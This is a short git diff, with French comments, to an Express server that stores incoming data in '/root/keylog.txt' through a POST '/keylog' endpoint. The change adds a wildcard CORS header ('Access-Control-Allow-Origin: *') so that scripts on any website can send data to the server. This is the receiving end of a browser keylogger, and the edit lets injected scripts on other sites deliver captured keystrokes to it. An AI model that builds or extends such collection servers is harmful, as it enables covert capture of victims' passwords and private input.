@@ -6,6 +6,13 @@ const app = express();
 const PORT = 3000;
 const LOG_FILE = '/root/keylog.txt';
 
+// Ajoute ceci AVANT app.use(express.json());
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*'); // Autorise toutes les origines
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+    next();
+});
+
 app.use(express.json());
 
 app.post('/keylog', (req, res) => {
